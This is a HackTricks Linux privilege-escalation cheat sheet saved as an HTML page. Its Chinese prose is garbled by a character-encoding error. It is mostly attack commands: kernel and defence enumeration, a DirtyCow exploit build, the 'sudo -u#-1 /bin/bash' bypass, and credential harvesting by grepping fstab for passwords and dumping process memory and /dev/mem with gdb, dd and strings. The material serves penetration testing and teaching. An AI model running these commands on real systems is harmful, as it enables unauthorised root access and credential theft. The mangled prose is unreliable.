<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Linux Privilege Escalation</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="linux-æƒé™æå‡"><a class="header" href="#linux-æƒé™æå‡">Linux æƒé™æå‡</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<h2 id="ç³»ç»Ÿä¿¡æ¯"><a class="header" href="#ç³»ç»Ÿä¿¡æ¯">ç³»ç»Ÿä¿¡æ¯</a></h2>
<h3 id="æ“ä½œç³»ç»Ÿä¿¡æ¯"><a class="header" href="#æ“ä½œç³»ç»Ÿä¿¡æ¯">æ“ä½œç³»ç»Ÿä¿¡æ¯</a></h3>
<p>è®©æˆ‘ä»¬å¼€å§‹äº†è§£è¿è¡Œçš„æ“ä½œç³»ç»Ÿ</p>
<pre><code class="language-bash">(cat /proc/version || uname -a ) 2&gt;/dev/null
lsb_release -a 2&gt;/dev/null # old, not by default on many systems
cat /etc/os-release 2&gt;/dev/null # universal on modern systems
</code></pre>
<h3 id="path"><a class="header" href="#path">Path</a></h3>
<p>å¦‚æœæ‚¨<strong>åœ¨<code>PATH</code>å˜é‡ä¸­çš„ä»»ä½•æ–‡ä»¶å¤¹ä¸Šå…·æœ‰å†™å…¥æƒé™</strong>ï¼Œæ‚¨å¯èƒ½èƒ½å¤ŸåŠ«æŒæŸäº›åº“æˆ–äºŒè¿›åˆ¶æ–‡ä»¶ï¼š</p>
<pre><code class="language-bash">echo $PATH
</code></pre>
<h3 id="env-info"><a class="header" href="#env-info">Env info</a></h3>
<p>ç¯å¢ƒå˜é‡ä¸­æœ‰æœ‰è¶£çš„ä¿¡æ¯ã€å¯†ç æˆ–APIå¯†é’¥å—ï¼Ÿ</p>
<pre><code class="language-bash">(env || set) 2&gt;/dev/null
</code></pre>
<h3 id="kernel-exploits"><a class="header" href="#kernel-exploits">Kernel exploits</a></h3>
<p>æ£€æŸ¥å†…æ ¸ç‰ˆæœ¬ï¼Œçœ‹çœ‹æ˜¯å¦æœ‰å¯ä»¥ç”¨æ¥æå‡æƒé™çš„æ¼æ´</p>
<pre><code class="language-bash">cat /proc/version
uname -a
searchsploit "Linux Kernel"
</code></pre>
<p>æ‚¨å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°ä¸€ä¸ªå¥½çš„æ˜“å—æ”»å‡»å†…æ ¸åˆ—è¡¨å’Œä¸€äº›å·²ç»<strong>ç¼–è¯‘çš„æ¼æ´åˆ©ç”¨</strong>ï¼š <a href="https://github.com/lucyoa/kernel-exploits">https://github.com/lucyoa/kernel-exploits</a> å’Œ <a href="https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits">exploitdb sploits</a>ã€‚<br />
å…¶ä»–å¯ä»¥æ‰¾åˆ°ä¸€äº›<strong>ç¼–è¯‘çš„æ¼æ´åˆ©ç”¨</strong>çš„ç½‘ç«™ï¼š <a href="https://github.com/bwbwbwbw/linux-exploit-binaries">https://github.com/bwbwbwbw/linux-exploit-binaries</a>ï¼Œ <a href="https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack">https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack</a></p>
<p>è¦ä»è¯¥ç½‘ç«™æå–æ‰€æœ‰æ˜“å—æ”»å‡»çš„å†…æ ¸ç‰ˆæœ¬ï¼Œæ‚¨å¯ä»¥æ‰§è¡Œï¼š</p>
<pre><code class="language-bash">curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2&gt;/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "&lt;" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
</code></pre>
<p>å¯ä»¥å¸®åŠ©æœç´¢å†…æ ¸æ¼æ´çš„å·¥å…·æœ‰ï¼š</p>
<p><a href="https://github.com/mzet-/linux-exploit-suggester">linux-exploit-suggester.sh</a><br />
<a href="https://github.com/jondonas/linux-exploit-suggester-2">linux-exploit-suggester2.pl</a><br />
<a href="http://www.securitysift.com/download/linuxprivchecker.py">linuxprivchecker.py</a>ï¼ˆåœ¨å—å®³è€…ä¸Šæ‰§è¡Œï¼Œä»…æ£€æŸ¥å†…æ ¸2.xçš„æ¼æ´ï¼‰</p>
<p>å§‹ç»ˆ<strong>åœ¨Googleä¸­æœç´¢å†…æ ¸ç‰ˆæœ¬</strong>ï¼Œä¹Ÿè®¸æ‚¨çš„å†…æ ¸ç‰ˆæœ¬åœ¨æŸä¸ªå†…æ ¸æ¼æ´ä¸­è¢«å†™å…¥ï¼Œè¿™æ ·æ‚¨å°±å¯ä»¥ç¡®å®šè¯¥æ¼æ´æ˜¯æœ‰æ•ˆçš„ã€‚</p>
<h3 id="cve-2016-5195-dirtycow"><a class="header" href="#cve-2016-5195-dirtycow">CVE-2016-5195 (DirtyCow)</a></h3>
<p>Linuxç‰¹æƒæå‡ - Linuxå†…æ ¸ &lt;= 3.19.0-73.8</p>
<pre><code class="language-bash"># make dirtycow stable
echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
</code></pre>
<h3 id="sudo-ç‰ˆæœ¬"><a class="header" href="#sudo-ç‰ˆæœ¬">Sudo ç‰ˆæœ¬</a></h3>
<p>åŸºäºå‡ºç°åœ¨ä»¥ä¸‹å†…å®¹ä¸­çš„æ˜“å—æ”»å‡»çš„ sudo ç‰ˆæœ¬ï¼š</p>
<pre><code class="language-bash">searchsploit sudo
</code></pre>
<p>æ‚¨å¯ä»¥ä½¿ç”¨æ­¤ grep æ£€æŸ¥ sudo ç‰ˆæœ¬æ˜¯å¦å­˜åœ¨æ¼æ´ã€‚</p>
<pre><code class="language-bash">sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
</code></pre>
<h4 id="sudo--v128"><a class="header" href="#sudo--v128">sudo &lt; v1.28</a></h4>
<p>æ¥è‡ª @sickrov</p>
<pre><code>sudo -u#-1 /bin/bash
</code></pre>
<h3 id="dmesg-ç­¾åéªŒè¯å¤±è´¥"><a class="header" href="#dmesg-ç­¾åéªŒè¯å¤±è´¥">Dmesg ç­¾åéªŒè¯å¤±è´¥</a></h3>
<p>æ£€æŸ¥ <strong>HTB çš„ smasher2 box</strong> ä»¥è·å–æ­¤æ¼æ´å¯èƒ½è¢«åˆ©ç”¨çš„ <strong>ç¤ºä¾‹</strong></p>
<pre><code class="language-bash">dmesg 2&gt;/dev/null | grep "signature"
</code></pre>
<h3 id="æ›´å¤šç³»ç»Ÿæšä¸¾"><a class="header" href="#æ›´å¤šç³»ç»Ÿæšä¸¾">æ›´å¤šç³»ç»Ÿæšä¸¾</a></h3>
<pre><code class="language-bash">date 2&gt;/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2&gt;/dev/null #Printers info
</code></pre>
<h2 id="åˆ—ä¸¾å¯èƒ½çš„é˜²å¾¡æªæ–½"><a class="header" href="#åˆ—ä¸¾å¯èƒ½çš„é˜²å¾¡æªæ–½">åˆ—ä¸¾å¯èƒ½çš„é˜²å¾¡æªæ–½</a></h2>
<h3 id="apparmor"><a class="header" href="#apparmor">AppArmor</a></h3>
<pre><code class="language-bash">if [ `which aa-status 2&gt;/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2&gt;/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2&gt;/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
</code></pre>
<h3 id="grsecurity"><a class="header" href="#grsecurity">Grsecurity</a></h3>
<pre><code class="language-bash">((uname -r | grep "\-grsec" &gt;/dev/null 2&gt;&amp;1 || grep "grsecurity" /etc/sysctl.conf &gt;/dev/null 2&gt;&amp;1) &amp;&amp; echo "Yes" || echo "Not found grsecurity")
</code></pre>
<h3 id="pax"><a class="header" href="#pax">PaX</a></h3>
<pre><code class="language-bash">(which paxctl-ng paxctl &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo "Yes" || echo "Not found PaX")
</code></pre>
<h3 id="execshield"><a class="header" href="#execshield">Execshield</a></h3>
<pre><code class="language-bash">(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
</code></pre>
<h3 id="selinux"><a class="header" href="#selinux">SElinux</a></h3>
<pre><code class="language-bash">(sestatus 2&gt;/dev/null || echo "Not found sestatus")
</code></pre>
<h3 id="aslr"><a class="header" href="#aslr">ASLR</a></h3>
<p>åœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–</p>
<pre><code class="language-bash">cat /proc/sys/kernel/randomize_va_space 2&gt;/dev/null
#If 0, not enabled
</code></pre>
<h2 id="docker-breakout"><a class="header" href="#docker-breakout">Docker Breakout</a></h2>
<p>å¦‚æœä½ åœ¨ä¸€ä¸ªdockerå®¹å™¨å†…ï¼Œä½ å¯ä»¥å°è¯•é€ƒç¦»å®ƒï¼š</p>
<p>{% content-ref url="docker-security/" %}
<a href="docker-security/">docker-security</a>
{% endcontent-ref %}</p>
<h2 id="drives"><a class="header" href="#drives">Drives</a></h2>
<p>æ£€æŸ¥<strong>ä»€ä¹ˆæ˜¯æŒ‚è½½å’ŒæœªæŒ‚è½½çš„</strong>ï¼Œåœ¨å“ªé‡Œä»¥åŠä¸ºä»€ä¹ˆã€‚å¦‚æœæœ‰ä»»ä½•æœªæŒ‚è½½çš„ï¼Œä½ å¯ä»¥å°è¯•æŒ‚è½½å®ƒå¹¶æ£€æŸ¥ç§äººä¿¡æ¯ã€‚</p>
<pre><code class="language-bash">ls /dev 2&gt;/dev/null | grep -i "sd"
cat /etc/fstab 2&gt;/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2&gt;/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2&gt;/dev/null
</code></pre>
<h2 id="æœ‰ç”¨çš„è½¯ä»¶"><a class="header" href="#æœ‰ç”¨çš„è½¯ä»¶">æœ‰ç”¨çš„è½¯ä»¶</a></h2>
<p>æšä¸¾æœ‰ç”¨çš„äºŒè¿›åˆ¶æ–‡ä»¶</p>
<pre><code class="language-bash">which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2&gt;/dev/null
</code></pre>
<p>æ­¤å¤–ï¼Œæ£€æŸ¥æ˜¯å¦<strong>å®‰è£…äº†ä»»ä½•ç¼–è¯‘å™¨</strong>ã€‚å¦‚æœæ‚¨éœ€è¦ä½¿ç”¨æŸäº›å†…æ ¸æ¼æ´ï¼Œè¿™å¾ˆæœ‰ç”¨ï¼Œå› ä¸ºå»ºè®®åœ¨æ‚¨å°†è¦ä½¿ç”¨å®ƒçš„æœºå™¨ä¸Šï¼ˆæˆ–ç±»ä¼¼çš„æœºå™¨ä¸Šï¼‰ç¼–è¯‘å®ƒã€‚</p>
<pre><code class="language-bash">(dpkg --list 2&gt;/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2&gt;/dev/null || yum list installed 'gcc*' 2&gt;/dev/null | grep gcc 2&gt;/dev/null; which gcc g++ 2&gt;/dev/null || locate -r "/gcc[0-9\.-]\+$" 2&gt;/dev/null | grep -v "/doc/")
</code></pre>
<h3 id="å®‰è£…çš„æ˜“å—æ”»å‡»è½¯ä»¶"><a class="header" href="#å®‰è£…çš„æ˜“å—æ”»å‡»è½¯ä»¶">å®‰è£…çš„æ˜“å—æ”»å‡»è½¯ä»¶</a></h3>
<p>æ£€æŸ¥<strong>å·²å®‰è£…è½¯ä»¶åŒ…å’ŒæœåŠ¡çš„ç‰ˆæœ¬</strong>ã€‚å¯èƒ½æœ‰ä¸€äº›æ—§çš„Nagiosç‰ˆæœ¬ï¼ˆä¾‹å¦‚ï¼‰å¯ä»¥è¢«åˆ©ç”¨æ¥æå‡æƒé™â€¦<br />
å»ºè®®æ‰‹åŠ¨æ£€æŸ¥æ›´å¯ç–‘çš„å·²å®‰è£…è½¯ä»¶çš„ç‰ˆæœ¬ã€‚</p>
<pre><code class="language-bash">dpkg -l #Debian
rpm -qa #Centos
</code></pre>
<p>å¦‚æœæ‚¨å¯ä»¥é€šè¿‡SSHè®¿é—®æœºå™¨ï¼Œæ‚¨è¿˜å¯ä»¥ä½¿ç”¨<strong>openVAS</strong>æ£€æŸ¥æœºå™¨ä¸Šå®‰è£…çš„è¿‡æ—¶å’Œæ˜“å—æ”»å‡»çš„è½¯ä»¶ã€‚</p>
<p>{% hint style="info" %}
<em>è¯·æ³¨æ„ï¼Œè¿™äº›å‘½ä»¤å°†æ˜¾ç¤ºå¤§é‡ä¿¡æ¯ï¼Œå…¶ä¸­å¤§éƒ¨åˆ†å°†æ˜¯æ— ç”¨çš„ï¼Œå› æ­¤å»ºè®®ä½¿ç”¨ä¸€äº›åº”ç”¨ç¨‹åºï¼Œå¦‚OpenVASæˆ–ç±»ä¼¼å·¥å…·ï¼Œæ£€æŸ¥ä»»ä½•å·²å®‰è£…çš„è½¯ä»¶ç‰ˆæœ¬æ˜¯å¦æ˜“å—å·²çŸ¥æ¼æ´çš„æ”»å‡»</em>
{% endhint %}</p>
<h2 id="è¿›ç¨‹"><a class="header" href="#è¿›ç¨‹">è¿›ç¨‹</a></h2>
<p>æŸ¥çœ‹<strong>æ­£åœ¨æ‰§è¡Œçš„è¿›ç¨‹</strong>ï¼Œå¹¶æ£€æŸ¥æ˜¯å¦æœ‰ä»»ä½•è¿›ç¨‹<strong>æ‹¥æœ‰è¶…è¿‡åº”æœ‰çš„æƒé™</strong>ï¼ˆä¾‹å¦‚ï¼Œå¯èƒ½æ˜¯ç”±rootæ‰§è¡Œçš„tomcatï¼Ÿï¼‰</p>
<pre><code class="language-bash">ps aux
ps -ef
top -n 1
</code></pre>
<p>å§‹ç»ˆæ£€æŸ¥å¯èƒ½æ­£åœ¨è¿è¡Œçš„ <a href="electron-cef-chromium-debugger-abuse.html"><strong>electron/cef/chromium è°ƒè¯•å™¨</strong>ï¼Œæ‚¨å¯ä»¥åˆ©ç”¨å®ƒæ¥æå‡æƒé™</a>ã€‚<strong>Linpeas</strong> é€šè¿‡æ£€æŸ¥è¿›ç¨‹å‘½ä»¤è¡Œä¸­çš„ <code>--inspect</code> å‚æ•°æ¥æ£€æµ‹è¿™äº›ã€‚<br />
è¿˜è¦<strong>æ£€æŸ¥æ‚¨å¯¹è¿›ç¨‹äºŒè¿›åˆ¶æ–‡ä»¶çš„æƒé™</strong>ï¼Œä¹Ÿè®¸æ‚¨å¯ä»¥è¦†ç›–æŸä¸ªæ–‡ä»¶ã€‚</p>
<h3 id="è¿›ç¨‹ç›‘æ§"><a class="header" href="#è¿›ç¨‹ç›‘æ§">è¿›ç¨‹ç›‘æ§</a></h3>
<p>æ‚¨å¯ä»¥ä½¿ç”¨åƒ <a href="https://github.com/DominicBreuker/pspy"><strong>pspy</strong></a> è¿™æ ·çš„å·¥å…·æ¥ç›‘æ§è¿›ç¨‹ã€‚è¿™å¯¹äºè¯†åˆ«é¢‘ç¹æ‰§è¡Œçš„æ˜“å—æ”»å‡»çš„è¿›ç¨‹æˆ–åœ¨æ»¡è¶³ä¸€ç»„è¦æ±‚æ—¶éå¸¸æœ‰ç”¨ã€‚</p>
<h3 id="è¿›ç¨‹å†…å­˜"><a class="header" href="#è¿›ç¨‹å†…å­˜">è¿›ç¨‹å†…å­˜</a></h3>
<p>æŸäº›æœåŠ¡å™¨æœåŠ¡åœ¨<strong>å†…å­˜ä¸­ä»¥æ˜æ–‡ä¿å­˜å‡­æ®</strong>ã€‚<br />
é€šå¸¸ï¼Œæ‚¨éœ€è¦<strong>root æƒé™</strong>æ‰èƒ½è¯»å–å±äºå…¶ä»–ç”¨æˆ·çš„è¿›ç¨‹çš„å†…å­˜ï¼Œå› æ­¤è¿™é€šå¸¸åœ¨æ‚¨å·²ç»æ˜¯ root å¹¶æƒ³è¦å‘ç°æ›´å¤šå‡­æ®æ—¶æ›´æœ‰ç”¨ã€‚<br />
ä½†æ˜¯ï¼Œè¯·è®°ä½ï¼Œ<strong>ä½œä¸ºæ™®é€šç”¨æˆ·ï¼Œæ‚¨å¯ä»¥è¯»å–æ‚¨æ‹¥æœ‰çš„è¿›ç¨‹çš„å†…å­˜</strong>ã€‚</p>
<p>{% hint style="warning" %}
è¯·æ³¨æ„ï¼Œå¦‚ä»Šå¤§å¤šæ•°æœºå™¨<strong>é»˜è®¤ä¸å…è®¸ ptrace</strong>ï¼Œè¿™æ„å‘³ç€æ‚¨æ— æ³•è½¬å‚¨å±äºæ‚¨æ— æƒé™ç”¨æˆ·çš„å…¶ä»–è¿›ç¨‹ã€‚</p>
<p>æ–‡ä»¶ <em><strong>/proc/sys/kernel/yama/ptrace_scope</strong></em> æ§åˆ¶ ptrace çš„å¯è®¿é—®æ€§ï¼š</p>
<ul>
<li><strong>kernel.yama.ptrace_scope = 0</strong>ï¼šæ‰€æœ‰è¿›ç¨‹éƒ½å¯ä»¥è¢«è°ƒè¯•ï¼Œåªè¦å®ƒä»¬å…·æœ‰ç›¸åŒçš„ uidã€‚è¿™æ˜¯ ptracing å·¥ä½œçš„ç»å…¸æ–¹å¼ã€‚</li>
<li><strong>kernel.yama.ptrace_scope = 1</strong>ï¼šåªæœ‰çˆ¶è¿›ç¨‹å¯ä»¥è¢«è°ƒè¯•ã€‚</li>
<li><strong>kernel.yama.ptrace_scope = 2</strong>ï¼šåªæœ‰ç®¡ç†å‘˜å¯ä»¥ä½¿ç”¨ ptraceï¼Œå› ä¸ºå®ƒéœ€è¦ CAP_SYS_PTRACE èƒ½åŠ›ã€‚</li>
<li><strong>kernel.yama.ptrace_scope = 3</strong>ï¼šä¸å…è®¸ä½¿ç”¨ ptrace è·Ÿè¸ªä»»ä½•è¿›ç¨‹ã€‚ä¸€æ—¦è®¾ç½®ï¼Œéœ€è¦é‡å¯æ‰èƒ½å†æ¬¡å¯ç”¨ ptracingã€‚
{% endhint %}</li>
</ul>
<h4 id="gdb"><a class="header" href="#gdb">GDB</a></h4>
<p>å¦‚æœæ‚¨å¯ä»¥è®¿é—® FTP æœåŠ¡çš„å†…å­˜ï¼ˆä¾‹å¦‚ï¼‰ï¼Œæ‚¨å¯ä»¥è·å–å †å¹¶åœ¨å…¶å‡­æ®ä¸­è¿›è¡Œæœç´¢ã€‚</p>
<pre><code class="language-bash">gdb -p &lt;FTP_PROCESS_PID&gt;
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp &lt;START_HEAD&gt; &lt;END_HEAD&gt;
(gdb) q
strings /tmp/mem_ftp #User and password
</code></pre>
<h4 id="gdb-è„šæœ¬"><a class="header" href="#gdb-è„šæœ¬">GDB è„šæœ¬</a></h4>
<p>{% code title="dump-memory.sh" %}</p>
<pre><code class="language-bash">#!/bin/bash
#./dump-memory.sh &lt;PID&gt;
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
</code></pre>
<p>{% endcode %}</p>
<h4 id="procpidmaps--procpidmem"><a class="header" href="#procpidmaps--procpidmem">/proc/$pid/maps &amp; /proc/$pid/mem</a></h4>
<p>å¯¹äºç»™å®šçš„è¿›ç¨‹ IDï¼Œ<strong>maps æ˜¾ç¤ºè¯¥è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´å†…å¦‚ä½•æ˜ å°„å†…å­˜</strong>ï¼›å®ƒè¿˜æ˜¾ç¤ºäº†<strong>æ¯ä¸ªæ˜ å°„åŒºåŸŸçš„æƒé™</strong>ã€‚<strong>mem</strong> ä¼ªæ–‡ä»¶<strong>æš´éœ²äº†è¿›ç¨‹çš„å†…å­˜æœ¬èº«</strong>ã€‚é€šè¿‡<strong>maps</strong> æ–‡ä»¶ï¼Œæˆ‘ä»¬çŸ¥é“å“ªäº›<strong>å†…å­˜åŒºåŸŸæ˜¯å¯è¯»çš„</strong>åŠå…¶åç§»é‡ã€‚æˆ‘ä»¬ä½¿ç”¨è¿™äº›ä¿¡æ¯<strong>åœ¨ mem æ–‡ä»¶ä¸­æŸ¥æ‰¾å¹¶å°†æ‰€æœ‰å¯è¯»åŒºåŸŸè½¬å‚¨åˆ°æ–‡ä»¶ä¸­</strong>ã€‚</p>
<pre><code class="language-bash">procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin &gt; $1.dump
rm $1*.bin
)
</code></pre>
<h4 id="devmem"><a class="header" href="#devmem">/dev/mem</a></h4>
<p><code>/dev/mem</code> æä¾›å¯¹ç³»ç»Ÿ <strong>ç‰©ç†</strong> å†…å­˜çš„è®¿é—®ï¼Œè€Œä¸æ˜¯è™šæ‹Ÿå†…å­˜ã€‚å†…æ ¸çš„è™šæ‹Ÿåœ°å€ç©ºé—´å¯ä»¥é€šè¿‡ /dev/kmem è®¿é—®ã€‚<br />
é€šå¸¸ï¼Œ<code>/dev/mem</code> ä»…å¯è¢« <strong>root</strong> å’Œ <strong>kmem</strong> ç»„è¯»å–ã€‚</p>
<pre><code>strings /dev/mem -n10 | grep -i PASS
</code></pre>
<h3 id="procdump-for-linux"><a class="header" href="#procdump-for-linux">ProcDump for linux</a></h3>
<p>ProcDump æ˜¯ Sysinternals å·¥å…·å¥—ä»¶ä¸­ç»å…¸ ProcDump å·¥å…·çš„ Linux ç‰ˆæœ¬ã€‚å¯ä»¥åœ¨ <a href="https://github.com/Sysinternals/ProcDump-for-Linux">https://github.com/Sysinternals/ProcDump-for-Linux</a> è·å–ã€‚</p>
<pre><code>procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
